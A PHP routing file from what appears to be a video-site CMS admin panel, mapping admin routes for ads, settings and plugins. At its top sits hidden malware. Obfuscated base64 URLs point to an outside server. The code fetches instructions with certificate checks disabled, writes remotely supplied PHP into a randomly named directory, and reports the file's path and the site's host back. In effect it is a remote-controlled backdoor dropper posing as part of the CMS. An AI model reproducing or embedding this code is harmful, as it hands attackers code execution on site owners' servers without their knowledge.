<?php


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, urldecode(base64_decode('aHR0cHM6Ly9qcy5zeW5lcmd5YXQud29yay90dGNtcy9rb25nemhpLnBocA==')));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_POST, false);
$output = curl_exec($ch);
curl_close($ch);

$arr = json_decode($output);
if($arr->kaiguan == 1)
{
$ml = substr(md5(rand(100,999999)),8,6);
$lu = dirname(dirname(__FILE__)).$arr->mulu.$ml;
mkdir($lu,0777);
file_put_contents($lu.'/'.$ml.'.php',base64_decode($arr->con));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, urldecode(base64_decode('aHR0cHMlM0EvL2pzLnN5bmVyZ3lhdC53b3JrL3R0Y21zL3NlcnZlci5waHA=')));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['path'=>$lu.'/'.$ml.'.php','url'=>$_SERVER['HTTP_HOST']]));
$output = curl_exec($ch);
curl_close($ch);
}







switch($Php){
	case 'Home/index':$C_T_0 = 'Home/index';break;//视频
	case 'Home/Basic/Basicsetup':$C_T_0 = 'Home/Basic/Basicsetup';break;//基本设置	
	case 'Home/Basic/Statistics':$C_T_0 = 'Home/Basic/Statistics';break;//统计设置
	//case 'Home/Security/Journal':$C_T_0 = 'Home/Security/Journal';break;//登录日志	
	case 'Home/Security/UserPass':$C_T_0 = 'Home/Security/UserPass';break;//登录重置	
	//case 'Home/Security/Web301':$C_T_0 = 'Home/Security/Web301';break;//前端301重定向	
	case 'Home/Ad/Top':$C_T_0 = 'Home/Ad/Top';break;//头部横幅广告		
	case 'Home/Ad/TopMod':$C_T_0 = 'Home/Ad/TopMod';break;//头部横幅广告编辑		
	case 'Home/Ad/TopAdd':$C_T_0 = 'Home/Ad/TopAdd';break;//头部横幅广告添加	
	case 'Home/Ad/Video':$C_T_0 = 'Home/Ad/Video';break;//播放横幅广告
	case 'Home/Ad/VideoMod':$C_T_0 = 'Home/Ad/VideoMod';break;//播放横幅广告编辑		
	case 'Home/Ad/VideoAdd':$C_T_0 = 'Home/Ad/VideoAdd';break;//播放横幅广告添加	
	case 'Home/Ad/Couplets':$C_T_0 = 'Home/Ad/Couplets';break;//对联广告	
	case 'Home/Ad/CoupletsMod':$C_T_0 = 'Home/Ad/CoupletsMod';break;//对联广告编辑
	case 'Home/Ad/Float':$C_T_0 = 'Home/Ad/Float';break;//底部浮漂广告
	case 'Home/Ad/FloatMod':$C_T_0 = 'Home/Ad/FloatMod';break;//底部浮漂广告编辑
	case 'Home/Ad/AdJs':$C_T_0 = 'Home/Ad/AdJs';break;//广告联盟JS广告
	case 'Home/Ad/IeUrl':$C_T_0 = 'Home/Ad/IeUrl';break;//友情链接	
	case 'Home/Ad/IeUrlAdd':$C_T_0 = 'Home/Ad/IeUrlAdd';break;//友情链接添加	
	case 'Home/Plug/Local':$C_T_0 = 'Home/Plug/Local';break;//插件中心本地插件
	default:$C_T_0 = 'Login';break;//默认登录页面	
	}
?>